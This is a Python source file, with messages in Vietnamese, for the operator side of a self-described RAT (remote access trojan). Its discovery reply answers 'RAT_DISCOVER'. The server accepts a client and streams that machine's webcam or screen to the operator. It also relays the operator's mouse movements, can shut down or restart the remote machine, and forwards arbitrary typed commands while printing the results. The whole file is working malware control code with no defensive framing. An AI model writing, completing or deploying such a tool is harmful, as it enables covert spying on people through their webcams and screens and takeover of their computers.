import socket
import struct
import cv2
import numpy as np
import threading
import time
import pyautogui
from pynput import mouse

HOST = '0.0.0.0'
PORT = 12345
UDP_PORT = 5005

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except:
        return "127.0.0.1"
    finally:
        s.close()

def udp_discovery_server():
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp.bind(('', UDP_PORT))
    print(f"[UDP] Đang chờ client tìm qua cổng {UDP_PORT}...")
    while True:
        try:
            data, addr = udp.recvfrom(1024)
            if data.decode() == "RAT_DISCOVER":
                ip = get_local_ip()
                response = f"{ip}:{PORT}"
                udp.sendto(response.encode(), addr)
        except Exception as e:
            print(f"[UDP ERROR] {e}")

def recv_exact(sock, size):
    data = b""
    while len(data) < size:
        try:
            packet = sock.recv(size - len(data))
            if not packet:
                raise ConnectionError("Mất kết nối trong khi nhận dữ liệu.")
            data += packet
        except socket.timeout:
            raise TimeoutError("Quá thời gian chờ dữ liệu.")
    return data

def receive_stream(client, stop_event):
    print("[*] Bắt đầu nhận stream (nhấn 'q' để dừng)...")
    try:
        while not stop_event.is_set():
            raw_size = recv_exact(client, 4)
            size = struct.unpack(">I", raw_size)[0]
            data = recv_exact(client, size)
            frame = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
            if frame is None:
                continue
            cv2.imshow("Livestream", frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                stop_event.set()
                break
    except Exception as e:
        print(f"[!] Lỗi nhận stream: {e}")
    finally:
        cv2.destroyAllWindows()

def start_mouse_control(client, stop_event):
    def on_move(x, y):
        if stop_event.is_set(): return False
        try:
            client.send(f"mouse_move:{x},{y}\n".encode())
        except:
            stop_event.set(); return False

    def on_click(x, y, button, pressed):
        if stop_event.is_set(): return False
        try:
            state = "down" if pressed else "up"
            client.send(f"mouse_click:{x},{y},{button.name},{state}\n".encode())
        except:
            stop_event.set(); return False

    def on_scroll(x, y, dx, dy):
        if stop_event.is_set(): return False
        try:
            client.send(f"mouse_scroll:{x},{y},{dy}\n".encode())
        except:
            stop_event.set(); return False

    with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
        listener.join()

def main():
    threading.Thread(target=udp_discovery_server, daemon=True).start()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Đang chờ client TCP tại {HOST}:{PORT}...")

    client, addr = server.accept()
    print(f"[+] Client kết nối từ {addr}")
    client.settimeout(10)
    stop_event = threading.Event()
    stream_thread = None

    try:
        while True:
            command = input(">>> ").strip()
            if not command:
                continue
            cmd = command.lower()

            if cmd in ["webcam", "screen"]:
                if stream_thread and stream_thread.is_alive():
                    print("[!] Đang có livestream, hãy dừng nó trước (gõ stop).")
                    continue
                client.send(cmd.encode())
                stop_event.clear()
                stream_thread = threading.Thread(target=receive_stream, args=(client, stop_event))
                stream_thread.start()

            elif cmd == "mouse":
                if stream_thread and stream_thread.is_alive():
                    print("[!] Đang có stream, dừng trước khi điều khiển chuột.")
                    continue
                client.send(b"mouse")
                stop_event.clear()
                stream_thread = threading.Thread(target=start_mouse_control, args=(client, stop_event))
                stream_thread.start()

            elif cmd == "stop":
                if stream_thread and stream_thread.is_alive():
                    client.send(b"stop")
                    stop_event.set()
                    stream_thread.join()
                    print("[*] Đã dừng chế độ.")
                else:
                    print("[!] Không có chế độ nào đang chạy.")

            elif cmd == "exit":
                client.send(b"exit")
                if stream_thread and stream_thread.is_alive():
                    stop_event.set()
                    stream_thread.join()
                break

            elif cmd == "shutdown":
                client.send(b"shutdown")

            elif cmd == "sleep":
                client.send(b"sleep")

            elif cmd == "restart":
                client.send(b"restart")

            elif cmd.startswith("key:"):
                client.send(command.encode())
                try:
                    data = client.recv(4096)
                    print(data.decode())
                except Exception as e:
                    print(f"[!] Lỗi nhận phản hồi: {e}")

            else:
                try:
                    client.send(command.encode())
                    data = client.recv(4096)
                    print(data.decode())
                except Exception as e:
                    print(f"[!] Lỗi phản hồi: {e}")

    finally:
        client.close()
        server.close()
        print("[*] Đóng kết nối server.")

if __name__ == "__main__":
    main()